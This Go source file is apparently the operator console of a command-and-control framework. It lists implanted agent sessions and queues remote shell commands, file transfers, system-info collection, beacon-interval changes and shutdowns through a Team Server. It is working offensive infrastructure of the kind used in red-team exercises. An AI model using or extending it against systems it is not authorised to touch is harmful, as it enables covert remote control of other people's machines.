// Command console is the Codé Operator Console entry point.
//
// The Operator Console is an interactive command-line gRPC client
// that allows operators to manage agent sessions on the Team Server.
//
// Supported commands (entered at the interactive prompt):
//
//	sessions                       — List all agent sessions
//	session <id>                   — Show details for a session
//	exec <session_id> <command>    — Queue a shell command for execution
//	upload <session_id> <path>     — Queue a file upload (agent → server)
//	download <session_id> <path>   — Queue a file download (server → agent)
//	sysinfo <session_id>           — Queue a sysinfo collection
//	sleep <session_id> <seconds>   — Change an agent's beacon interval
//	results <session_id>           — Retrieve task results for a session
//	shutdown <session_id>          — Gracefully shutdown a specific agent
//	shutdown-all                   — Broadcast shutdown to ALL agents
//	help                           — Show this help text
//	exit / quit                    — Exit the console
//
// Usage:
//
//	console \
//	    --server 10.13.37.1:50051 \
//	    --cert   ../certs/operator/operator.crt \
//	    --key    ../certs/operator/operator.key \
//	    --ca     ../certs/ca/ca.crt
//
// ACADEMIC/EDUCATIONAL USE ONLY.
package main

import (
	"bufio"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/c2-framework/console/internal/client"
)

const banner = `
   ██████╗ ██████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝
  ██║     ██║   ██║██║  ██║█████╗  
  ██║     ██║   ██║██║  ██║██╔══╝  
  ╚██████╗╚██████╔╝██████╔╝███████╗
   ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
              Operator Console v0.1.0
      ACADEMIC/EDUCATIONAL USE ONLY
`

const helpText = `
Available commands:

  sessions                        List all agent sessions
  session <id>                    Show detailed info for a session
  exec <session_id> <command>     Queue a shell command
  upload <session_id> <path>      Queue a file upload (agent → server)
  download <session_id> <path>    Queue a file download (server → agent)
  sysinfo <session_id>            Queue a sysinfo collection task
  sleep <session_id> <seconds>    Change agent beacon interval
  results <session_id>            Retrieve task results
  shutdown <session_id>           Gracefully shutdown an agent
  shutdown-all                    Broadcast shutdown to ALL agents
  help                            Show this help text
  exit / quit                     Exit the console
`

func main() {
	// ── Flags ────────────────────────────────────────
	serverAddr := flag.String("server", "10.13.37.1:50051",
		"Team Server gRPC address (host:port)")
	certFile := flag.String("cert", "", "Path to operator client certificate (PEM)")
	keyFile := flag.String("key", "", "Path to operator client private key (PEM)")
	caFile := flag.String("ca", "", "Path to CA certificate (PEM)")
	operatorName := flag.String("operator", "", "Operator identity (defaults to cert CN)")

	flag.Parse()

	// ── Banner ──────────────────────────────────────
	fmt.Print(banner)

	// ── Validate required flags ─────────────────────
	if *certFile == "" || *keyFile == "" || *caFile == "" {
		fmt.Fprintln(os.Stderr, "ERROR: --cert, --key, and --ca are required")
		flag.Usage()
		os.Exit(1)
	}

	// ── Resolve operator name ───────────────────────
	operator := *operatorName
	if operator == "" {
		// Default to the hostname if no operator name is set.
		hostname, err := os.Hostname()
		if err != nil {
			operator = "unknown"
		} else {
			operator = hostname
		}
	}

	// ── Connect to Team Server ──────────────────────
	cfg := client.Config{
		ServerAddr: *serverAddr,
		CertFile:   *certFile,
		KeyFile:    *keyFile,
		CAFile:     *caFile,
	}

	c := client.New(cfg)
	fmt.Printf("Connecting to Team Server at %s...\n", cfg.ServerAddr)

	if err := c.Connect(); err != nil {
		log.Fatalf("Failed to connect: %v", err)
	}
	defer c.Close()

	fmt.Println("Connected.")
	fmt.Println()

	// ── Interactive command loop ─────────────────────
	scanner := bufio.NewScanner(os.Stdin)

	for {
		fmt.Print("codé> ")
		if !scanner.Scan() {
			break
		}

		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		cmd := strings.ToLower(parts[0])
		args := parts[1:]

		switch cmd {
		case "help":
			fmt.Print(helpText)

		case "exit", "quit":
			fmt.Println("Goodbye.")
			return

		case "sessions":
			cmdListSessions(c)

		case "session":
			if len(args) < 1 {
				fmt.Println("Usage: session <session_id>")
				continue
			}
			cmdGetSession(c, args[0])

		case "exec":
			if len(args) < 2 {
				fmt.Println("Usage: exec <session_id> <command>")
				continue
			}
			command := strings.Join(args[1:], " ")
			cmdQueueTask(c, args[0], client.TaskTypeExec, []byte(command), operator)

		case "upload":
			if len(args) < 2 {
				fmt.Println("Usage: upload <session_id> <remote_path>")
				continue
			}
			cmdQueueTask(c, args[0], client.TaskTypeUpload, []byte(args[1]), operator)

		case "download":
			if len(args) < 2 {
				fmt.Println("Usage: download <session_id> <remote_path>")
				continue
			}
			cmdQueueTask(c, args[0], client.TaskTypeDownload, []byte(args[1]), operator)

		case "sysinfo":
			if len(args) < 1 {
				fmt.Println("Usage: sysinfo <session_id>")
				continue
			}
			cmdQueueTask(c, args[0], client.TaskTypeSysinfo, nil, operator)

		case "sleep":
			if len(args) < 2 {
				fmt.Println("Usage: sleep <session_id> <seconds>")
				continue
			}
			seconds, err := strconv.ParseUint(args[1], 10, 32)
			if err != nil {
				fmt.Printf("Invalid seconds value: %s\n", args[1])
				continue
			}
			// Encode seconds as a 4-byte big-endian uint32.
			data := make([]byte, 4)
			binary.BigEndian.PutUint32(data, uint32(seconds))
			cmdQueueTask(c, args[0], client.TaskTypeSleep, data, operator)

		case "results":
			if len(args) < 1 {
				fmt.Println("Usage: results <session_id>")
				continue
			}
			cmdGetResults(c, args[0])

		case "shutdown":
			if len(args) < 1 {
				fmt.Println("Usage: shutdown <session_id>")
				continue
			}
			cmdShutdown(c, args[0], operator)

		case "shutdown-all":
			cmdBroadcastShutdown(c, operator)

		default:
			fmt.Printf("Unknown command: %s (type 'help' for available commands)\n", cmd)
		}
	}

	if err := scanner.Err(); err != nil {
		log.Printf("Input error: %v", err)
	}
}

// ──────────────────────────────────────────────
//  Command handlers
// ──────────────────────────────────────────────

func cmdListSessions(c *client.Client) {
	sessions, err := c.ListSessions()
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}

	if len(sessions) == 0 {
		fmt.Println("No active sessions.")
		return
	}

	fmt.Printf("\n%-38s %-15s %-10s %-8s %-10s %-20s %s\n",
		"SESSION ID", "HOSTNAME", "OS", "ARCH", "STATE", "LAST SEEN", "REMOTE")
	fmt.Println(strings.Repeat("─", 120))

	for _, s := range sessions {
		lastSeen := "never"
		if s.LastSeen > 0 {
			lastSeen = time.Unix(s.LastSeen, 0).Format("2006-01-02 15:04:05")
		}

		state := client.SessionState(s.State).String()

		fmt.Printf("%-38s %-15s %-10s %-8s %-10s %-20s %s\n",
			s.SessionID, truncate(s.Hostname, 15), truncate(s.OS, 10),
			s.Arch, state, lastSeen, s.RemoteAddr)
	}
	fmt.Println()
}

func cmdGetSession(c *client.Client, sessionID string) {
	s, err := c.GetSession(sessionID)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}

	regAt := time.Unix(s.RegisteredAt, 0).Format(time.RFC3339)
	lastSeen := time.Unix(s.LastSeen, 0).Format(time.RFC3339)

	fmt.Printf("\n  Session:         %s\n", s.SessionID)
	fmt.Printf("  Hostname:        %s\n", s.Hostname)
	fmt.Printf("  OS:              %s\n", s.OS)
	fmt.Printf("  Architecture:    %s\n", s.Arch)
	fmt.Printf("  State:           %s\n", client.SessionState(s.State))
	fmt.Printf("  Registered At:   %s\n", regAt)
	fmt.Printf("  Last Seen:       %s\n", lastSeen)
	fmt.Printf("  Beacon Interval: %d seconds\n", s.BeaconInterval)
	fmt.Printf("  Jitter:          %d%%\n", s.Jitter)
	fmt.Printf("  Sequence:        %d\n", s.SeqNumber)
	fmt.Printf("  Remote Address:  %s\n\n", s.RemoteAddr)
}

func cmdQueueTask(c *client.Client, sessionID string, taskType client.TaskType, data []byte, operator string) {
	taskID, err := c.QueueTask(sessionID, taskType, data, operator)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}

	taskName := "task"
	switch taskType {
	case client.TaskTypeExec:
		taskName = "EXEC"
	case client.TaskTypeUpload:
		taskName = "UPLOAD"
	case client.TaskTypeDownload:
		taskName = "DOWNLOAD"
	case client.TaskTypeSysinfo:
		taskName = "SYSINFO"
	case client.TaskTypeSleep:
		taskName = "SLEEP"
	case client.TaskTypeExit:
		taskName = "EXIT"
	}

	fmt.Printf("Queued %s task: %s (session: %s)\n", taskName, taskID, sessionID)
}

func cmdGetResults(c *client.Client, sessionID string) {
	results, err := c.GetResults(sessionID)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}

	if len(results) == 0 {
		fmt.Println("No results for this session.")
		return
	}

	for i, r := range results {
		recvAt := time.Unix(r.ReceivedAt, 0).Format(time.RFC3339)

		fmt.Printf("\n── Result %d ──────────────────────────────\n", i+1)
		fmt.Printf("  Task ID:     %s\n", r.TaskID)
		fmt.Printf("  Received At: %s\n", recvAt)

		if r.ErrorMsg != "" {
			fmt.Printf("  Error:       %s\n", r.ErrorMsg)
		}

		if len(r.ResultData) > 0 {
			fmt.Printf("  Data (%d bytes):\n", len(r.ResultData))
			// Print as string if it looks like text.
			if isPrintable(r.ResultData) {
				fmt.Printf("%s\n", string(r.ResultData))
			} else {
				fmt.Printf("  [binary data, %d bytes]\n", len(r.ResultData))
			}
		}
	}
	fmt.Println()
}

func cmdShutdown(c *client.Client, sessionID, operator string) {
	if err := c.Shutdown(sessionID, operator); err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}
	fmt.Printf("Shutdown requested for session: %s\n", sessionID)
}

func cmdBroadcastShutdown(c *client.Client, operator string) {
	count, err := c.BroadcastShutdown(operator)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}
	fmt.Printf("Broadcast shutdown sent to %d sessions.\n", count)
}

// ──────────────────────────────────────────────
//  Helpers
// ──────────────────────────────────────────────

// truncate shortens a string to max length, appending "…" if truncated.
func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	if maxLen <= 1 {
		return "…"
	}
	return s[:maxLen-1] + "…"
}

// isPrintable returns true if the byte slice looks like printable text.
func isPrintable(data []byte) bool {
	for _, b := range data {
		if b < 0x20 && b != '\n' && b != '\r' && b != '\t' {
			return false
		}
	}
	return true
}
